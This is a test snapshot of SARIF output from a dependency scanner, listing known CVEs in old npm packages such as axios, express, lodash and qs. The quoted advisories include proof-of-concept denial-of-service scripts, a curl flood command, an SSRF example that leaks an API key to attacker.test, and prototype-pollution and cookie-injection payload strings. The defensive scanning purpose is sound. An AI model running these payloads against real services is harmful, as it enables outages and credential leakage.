---
source: crates/bazbom/tests/refactor_integration.rs
expression: sarif
---
{
  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
  "runs": [
    {
      "results": [
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "send@0.17.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-43799 found in send. ### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template. EPSS: 0.60%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "send",
            "epss_score": 0.00605,
            "priority": "P3",
            "reachable": false,
            "version": "0.17.1",
            "vulnerability_id": "CVE-2024-43799"
          },
          "ruleId": "CVE-2024-43799"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "axios@0.21.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2025-58754 found in axios. ## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c => c >= 200 && c < 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=>res.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"<http|https|data URL>\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) => {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () => controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) => {\n      if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () => limiter.end());\n    r.data.on(\"error\", (e) => limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () => {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json >/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.. EPSS: 0.08%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "axios",
            "epss_score": 0.00083,
            "priority": "P3",
            "reachable": false,
            "version": "0.21.1",
            "vulnerability_id": "CVE-2025-58754"
          },
          "ruleId": "CVE-2025-58754"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "axios@0.21.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2021-3749 found in axios. axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.. EPSS: 24.12%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "axios",
            "epss_score": 0.24124,
            "priority": "P3",
            "reachable": false,
            "version": "0.21.1",
            "vulnerability_id": "CVE-2021-3749"
          },
          "ruleId": "CVE-2021-3749"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "axios@0.21.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2025-27152 found in axios. ### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.. EPSS: 0.19%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "axios",
            "epss_score": 0.00186,
            "priority": "P3",
            "reachable": false,
            "version": "0.21.1",
            "vulnerability_id": "CVE-2025-27152"
          },
          "ruleId": "CVE-2025-27152"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "axios@0.21.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2023-45857 found in axios. An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.. EPSS: 0.24%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "axios",
            "epss_score": 0.00236,
            "priority": "P3",
            "reachable": false,
            "version": "0.21.1",
            "vulnerability_id": "CVE-2023-45857"
          },
          "ruleId": "CVE-2023-45857"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "body-parser@1.19.0"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-45590 found in body-parser. ### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n. EPSS: 2.19%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "body-parser",
            "epss_score": 0.02187,
            "priority": "P3",
            "reachable": false,
            "version": "1.19.0",
            "vulnerability_id": "CVE-2024-45590"
          },
          "ruleId": "CVE-2024-45590"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "serve-static@1.14.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-43800 found in serve-static. ### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n. EPSS: 0.44%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "serve-static",
            "epss_score": 0.00442,
            "priority": "P3",
            "reachable": false,
            "version": "1.14.1",
            "vulnerability_id": "CVE-2024-43800"
          },
          "ruleId": "CVE-2024-43800"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "express@4.17.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-43796 found in express. ### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n. EPSS: 0.49%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "express",
            "epss_score": 0.00488,
            "priority": "P3",
            "reachable": false,
            "version": "4.17.1",
            "vulnerability_id": "CVE-2024-43796"
          },
          "ruleId": "CVE-2024-43796"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "express@4.17.1"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-29041 found in express. ### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### References\n\nhttps://github.com/expressjs/express/pull/5539\nhttps://github.com/koajs/koa/issues/1800\nhttps://expressjs.com/en/4x/api.html#res.location. EPSS: 0.41%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "express",
            "epss_score": 0.00414,
            "priority": "P3",
            "reachable": false,
            "version": "4.17.1",
            "vulnerability_id": "CVE-2024-29041"
          },
          "ruleId": "CVE-2024-29041"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "path-to-regexp@0.1.7"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-45296 found in path-to-regexp. ### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/). EPSS: 0.56%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "path-to-regexp",
            "epss_score": 0.00557,
            "priority": "P3",
            "reachable": false,
            "version": "0.1.7",
            "vulnerability_id": "CVE-2024-45296"
          },
          "ruleId": "CVE-2024-45296"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "path-to-regexp@0.1.7"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-52798 found in path-to-regexp. ### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/. EPSS: 0.37%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "path-to-regexp",
            "epss_score": 0.00368,
            "priority": "P3",
            "reachable": false,
            "version": "0.1.7",
            "vulnerability_id": "CVE-2024-52798"
          },
          "ruleId": "CVE-2024-52798"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "qs@6.7.0"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2022-24999 found in qs. qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.. EPSS: 21.43%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "qs",
            "epss_score": 0.21425,
            "priority": "P3",
            "reachable": false,
            "version": "6.7.0",
            "vulnerability_id": "CVE-2022-24999"
          },
          "ruleId": "CVE-2022-24999"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lodash@4.17.15"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2020-28500 found in lodash. All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```. EPSS: 3.56%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "lodash",
            "epss_score": 0.03558,
            "priority": "P3",
            "reachable": false,
            "version": "4.17.15",
            "vulnerability_id": "CVE-2020-28500"
          },
          "ruleId": "CVE-2020-28500"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lodash@4.17.15"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2021-23337 found in lodash. `lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.. EPSS: 10.39%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "lodash",
            "epss_score": 0.10395,
            "priority": "P3",
            "reachable": false,
            "version": "4.17.15",
            "vulnerability_id": "CVE-2021-23337"
          },
          "ruleId": "CVE-2021-23337"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lodash@4.17.15"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2020-8203 found in lodash. Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.. EPSS: 3.28%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "lodash",
            "epss_score": 0.03276,
            "priority": "P3",
            "reachable": false,
            "version": "4.17.15",
            "vulnerability_id": "CVE-2020-8203"
          },
          "ruleId": "CVE-2020-8203"
        },
        {
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "cookie@0.4.0"
                }
              }
            }
          ],
          "message": {
            "text": "Vulnerability CVE-2024-47764 found in cookie. ### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167. EPSS: 0.39%. [✓] Code is UNREACHABLE - vulnerability not exploitable"
          },
          "properties": {
            "component": "cookie",
            "epss_score": 0.00391,
            "priority": "P3",
            "reachable": false,
            "version": "0.4.0",
            "vulnerability_id": "CVE-2024-47764"
          },
          "ruleId": "CVE-2024-47764"
        }
      ],
      "tool": {
        "driver": {
          "name": "BazBOM-SCA",
          "rules": [
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2023-45857",
              "shortDescription": {
                "text": "Vulnerability CVE-2023-45857"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-43799",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-43799"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2022-24999",
              "shortDescription": {
                "text": "Vulnerability CVE-2022-24999"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2021-23337",
              "shortDescription": {
                "text": "Vulnerability CVE-2021-23337"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-52798",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-52798"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-43796",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-43796"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-45296",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-45296"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2025-27152",
              "shortDescription": {
                "text": "Vulnerability CVE-2025-27152"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-43800",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-43800"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2020-8203",
              "shortDescription": {
                "text": "Vulnerability CVE-2020-8203"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2020-28500",
              "shortDescription": {
                "text": "Vulnerability CVE-2020-28500"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-45590",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-45590"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2021-3749",
              "shortDescription": {
                "text": "Vulnerability CVE-2021-3749"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-29041",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-29041"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2024-47764",
              "shortDescription": {
                "text": "Vulnerability CVE-2024-47764"
              }
            },
            {
              "defaultConfiguration": {
                "level": "warning"
              },
              "id": "CVE-2025-58754",
              "shortDescription": {
                "text": "Vulnerability CVE-2025-58754"
              }
            }
          ],
          "version": "6.5.0"
        }
      }
    }
  ],
  "version": "2.1.0"
}
